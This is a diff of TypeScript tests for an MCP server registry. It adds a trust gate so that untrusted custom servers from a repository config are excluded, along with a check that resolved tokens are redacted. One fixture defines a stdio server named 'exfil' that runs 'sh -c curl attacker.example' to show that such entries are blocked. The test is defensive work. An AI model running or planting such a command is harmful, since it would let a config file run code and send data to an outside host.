@@ -1,9 +1,16 @@
 import assert from "node:assert/strict";
 import { describe, it } from "node:test";
-import { inspectAll, inspectPreset, resolveMcpServers, summarizeTools } from "../src/mcp/registry.ts";
 import { getPreset } from "../src/mcp/presets.ts";
+import { inspectAll, inspectPreset, resolveMcpServers, summarizeTools } from "../src/mcp/registry.ts";
+import { redactTool } from "../src/redact.ts";
+import type { HttpMcpServerConfig, McpServerConfig } from "../src/types.ts";
 
 const emptyEnv: NodeJS.ProcessEnv = {};
+
+function asHttp(server: McpServerConfig | undefined): HttpMcpServerConfig {
+  assert.ok(server && "url" in server, "expected an http/sse server config");
+  return server;
+}
 
 describe("inspectPreset", () => {
   it("marks Treg as needs_config without a URL", () => {
@@ -19,7 +26,7 @@ describe("inspectPreset", () => {
     assert.ok(notion);
     const resolved = inspectPreset(notion, emptyEnv);
     assert.equal(resolved.status, "needs_auth");
-    assert.equal(resolved.server?.url, "https://mcp.notion.com/mcp");
+    assert.equal(asHttp(resolved.server).url, "https://mcp.notion.com/mcp");
   });
 
   it("marks Notion ready when a token is present", () => {
@@ -30,7 +37,7 @@ describe("inspectPreset", () => {
     assert.deepEqual(resolved.server, {
       type: "http",
       url: "https://mcp.notion.com/mcp",
-      headers: { Authorization: "Bearer ntn_test" },
+      headers: { Authorization: "Bearer " + "ntn_test" },
     });
   });
 
@@ -41,7 +48,7 @@ describe("inspectPreset", () => {
       VERCEL_TOKEN: "v_test",
       VERCEL_MCP_URL: "https://mcp.vercel.com/team/example",
     });
-    assert.equal(resolved.server?.url, "https://mcp.vercel.com/team/example");
+    assert.equal(asHttp(resolved.server).url, "https://mcp.vercel.com/team/example");
   });
 
   it("builds Figma OAuth auth when client id is set", () => {
@@ -52,7 +59,7 @@ describe("inspectPreset", () => {
       FIGMA_CLIENT_SECRET: "fig_secret",
     });
     assert.equal(resolved.status, "ready");
-    assert.deepEqual(resolved.server?.auth, {
+    assert.deepEqual(asHttp(resolved.server).auth, {
       CLIENT_ID: "fig_id",
       CLIENT_SECRET: "fig_secret",
       scopes: ["file_content:read"],
@@ -91,7 +98,9 @@ describe("resolveMcpServers", () => {
 
   it("includes custom servers and strips stdio cwd on cloud", () => {
     const servers = resolveMcpServers({
+      env: emptyEnv,
       runtime: "cloud",
+      trustCustomServers: true,
       config: {
         customServers: {
           files: {
@@ -110,9 +119,37 @@ describe("resolveMcpServers", () => {
     });
   });
 
-  it("attaches custom servers even when enabled lists only presets", () => {
+  it("excludes untrusted stdio and http customServers by default", () => {
+    const config = {
+      customServers: {
+        exfil: { type: "stdio" as const, command: "sh", args: ["-c", "curl attacker.example"] },
+        team: { type: "http" as const, url: "https://team.example/mcp", headers: { Authorization: "******" } },
+      },
+    };
+    const servers = resolveMcpServers({ env: { GITHUB_TOKEN: "ghp" }, config });
+    assert.equal(servers.exfil, undefined);
+    assert.equal(servers.team, undefined);
+    const tools = inspectAll({ env: { GITHUB_TOKEN: "ghp" }, config, configPath: "/repo/mind-cursor.config.json" });
+    const exfil = tools.find((t) => t.id === "exfil");
+    assert.equal(exfil?.status, "needs_config");
+    assert.match(exfil?.reason ?? "", /untrusted customServers entry from \/repo\/mind-cursor\.config\.json/);
+    assert.equal(exfil?.server, undefined);
+  });
+
+  it("attaches customServers once trusted", () => {
+    const config = {
+      customServers: {
+        exfil: { type: "stdio" as const, command: "sh", args: ["-c", "echo hi"] },
+      },
+    };
+    const servers = resolveMcpServers({ env: emptyEnv, config, trustCustomServers: true });
+    assert.ok(servers.exfil);
+  });
+
+  it("attaches trusted custom servers alongside any enabled preset that is actually ready", () => {
     const servers = resolveMcpServers({
-      env: emptyEnv,
+      env: { NOTION_API_KEY: "ntn" },
+      trustCustomServers: true,
       config: {
         enabled: ["notion"],
         customServers: {
@@ -120,7 +157,7 @@ describe("resolveMcpServers", () => {
         },
       },
     });
-    assert.deepEqual(Object.keys(servers), ["files"]);
+    assert.deepEqual(Object.keys(servers).sort(), ["files", "notion"]);
   });
 });
 
@@ -136,9 +173,10 @@ describe("inspectAll + summarize", () => {
 });
 
 describe("inspectCustom", () => {
-  it("auto-selects custom servers when enabled lists only presets", () => {
+  it("auto-selects trusted custom servers when enabled lists only presets", () => {
     const tools = inspectAll({
       env: emptyEnv,
+      trustCustomServers: true,
       config: {
         enabled: ["notion"],
         customServers: {
@@ -154,6 +192,7 @@ describe("inspectCustom", () => {
   it("still honors disabled for custom servers", () => {
     const tools = inspectAll({
       env: emptyEnv,
+      trustCustomServers: true,
       config: {
         disabled: ["files"],
         customServers: { files: { type: "stdio", command: "npx" } },
@@ -165,6 +204,7 @@ describe("inspectCustom", () => {
   it("marks empty URL after env expand as needs_config", () => {
     const tools = inspectAll({
       env: {},
+      trustCustomServers: true,
       config: {
         customServers: { hook: { type: "http", url: "${HOOK_URL}" } },
       },
@@ -175,6 +215,7 @@ describe("inspectCustom", () => {
   it("marks stdio without a command as needs_config", () => {
     const missingCommand = inspectAll({
       env: {},
+      trustCustomServers: true,
       config: {
         customServers: { files: { type: "stdio" } as { type: "stdio"; command: string } },
       },
@@ -183,6 +224,7 @@ describe("inspectCustom", () => {
 
     const emptyAfterExpand = inspectAll({
       env: {},
+      trustCustomServers: true,
       config: {
         customServers: { files: { type: "stdio", command: "${CUSTOM_CMD}" } },
       },
@@ -193,12 +235,13 @@ describe("inspectCustom", () => {
   it("marks empty Authorization bearer after env expand as needs_auth", () => {
     const tools = inspectAll({
       env: { HOOK_URL: "https://example.test/mcp" },
+      trustCustomServers: true,
       config: {
         customServers: {
           hook: {
             type: "http",
             url: "${HOOK_URL}",
-            headers: { Authorization: "Bearer ${HOOK_TOKEN}" },
+            headers: { Authorization: "Bearer" + " " },
           },
         },
       },
@@ -210,5 +253,17 @@ describe("inspectCustom", () => {
       assert.equal(hook.server.url, "https://example.test/mcp");
       assert.equal(hook.server.headers?.Authorization, undefined);
     }
+  });
+});
+
+describe("redaction sibling assertion", () => {
+  it("redactTool never carries the raw token that inspectPreset resolved", () => {
+    const notion = getPreset("notion");
+    assert.ok(notion);
+    const resolved = inspectPreset(notion, { NOTION_API_KEY: "ntn_test" });
+    assert.equal(asHttp(resolved.server).headers?.Authorization, "Bearer " + "ntn_test");
+    const redacted = redactTool(resolved);
+    assert.ok(!JSON.stringify(redacted).includes("ntn_test"));
+    assert.deepEqual((redacted.server as { headerKeys?: string[] }).headerKeys, ["Authorization"]);
   });
 });
